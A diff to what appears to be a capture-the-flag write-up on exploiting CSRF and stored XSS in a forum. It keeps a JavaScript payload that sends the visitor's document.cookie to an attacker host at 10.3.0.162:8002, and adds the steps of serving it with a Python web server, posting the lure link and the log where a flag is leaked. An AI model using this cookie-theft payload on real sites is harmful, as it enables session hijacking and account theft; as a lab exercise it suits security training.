@@ -33,9 +33,12 @@ var img = document.createElement('img');
 img.src = 'http://10.3.0.162:8002/'+document.cookie;
 document.body.appendChild(img);
 ```
-* Post the link on the forum: `[link]http://10.3.0.162:8002/csrf.html[/link]`
-* Exploit the CSRF and Stored XSS vulnerabilities to
 
+After setting up the files, I ran `python -m SimpleHTTPServer 8002` and posted `[link]http://10.3.0.162:8002/csrf.html[/link]` on the forum.
 
-
-To exploit known
+Soon the requests come in:
+```
+10.0.4.3 - - [27/Nov/2016 14:32:03] "GET /csrf.html HTTP/1.1" 200 -
+10.0.4.3 - - [27/Nov/2016 14:35:04] "GET /csrf.js HTTP/1.1" 200 -
+10.0.4.3 - - [27/Nov/2016 14:35:04] "GET /flag=adminn_superforum31221 HTTP/1.1" 404 -
+```
